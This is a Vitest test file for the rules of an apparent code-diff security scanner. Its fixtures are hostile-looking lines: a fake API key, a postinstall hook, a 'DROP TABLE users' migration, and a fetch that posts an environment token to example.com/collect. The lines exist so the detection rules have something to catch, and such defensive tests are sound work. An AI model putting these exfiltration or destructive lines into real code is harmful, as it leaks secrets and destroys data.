import { describe, expect, it } from "vitest";
import { defaultConfig } from "../src/config.js";
import { authAndSecretsRule } from "../src/rules/auth-and-secrets.js";
import { dependencyChangesRule } from "../src/rules/dependency-changes.js";
import { destructiveOpsRule } from "../src/rules/destructive-ops.js";
import { networkAndExecRule } from "../src/rules/network-and-exec.js";
import { sensitiveFilesRule } from "../src/rules/sensitive-files.js";
import type { DiffFile } from "../src/types.js";

function diffFile(path: string, addedLines: string[] = []): DiffFile {
  return {
    path,
    additions: addedLines.length,
    deletions: 0,
    addedLines,
    removedLines: [],
    isDeleted: false,
    isNew: false
  };
}

describe("rule modules", () => {
  it("flags protected paths and GitHub workflow changes separately", () => {
    const findings = sensitiveFilesRule([
      diffFile("src/auth/session.ts"),
      diffFile(".github/workflows/ci.yml")
    ], defaultConfig);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "protected-path-change",
        severity: "medium",
        score: 20,
        files: ["src/auth/session.ts", ".github/workflows/ci.yml"]
      }),
      expect.objectContaining({
        ruleId: "github-workflow-change",
        severity: "high",
        score: 25,
        files: [".github/workflows/ci.yml"]
      })
    ]));
  });

  it("halts when a secret-like value is added and redacts evidence", () => {
    const findings = authAndSecretsRule([
      diffFile("src/config.ts", ["const apiKey = '1234567890abcdef1234567890';"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "secret-like-string-added",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["src/config.ts"]
      })
    ]);
    expect(findings[0]?.evidence?.[0]).toContain("[redacted]");
  });

  it("halts package lifecycle scripts in dependency manifests", () => {
    const findings = dependencyChangesRule([
      diffFile("package.json", ["  \"postinstall\": \"node scripts/install.js\""])
    ], defaultConfig);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "dependency-manifest-change",
        severity: "medium",
        score: 20,
        files: ["package.json"]
      }),
      expect.objectContaining({
        ruleId: "install-script-added",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["package.json"]
      })
    ]));
  });

  it("halts destructive SQL operations with evidence", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/20260626_drop_users.sql", ["DROP TABLE users;"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "drop-table",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["migrations/20260626_drop_users.sql"],
        evidence: ["DROP TABLE users;"]
      })
    ]);
  });

  it("detects network egress near environment access", () => {
    const findings = networkAndExecRule([
      diffFile("src/export.ts", [
        "const token = process.env.API_TOKEN;",
        "await fetch('https://example.com/collect', { method: 'POST', body: token });"
      ])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "network-egress-with-env-access",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["src/export.ts"]
      })
    ]);
  });
});
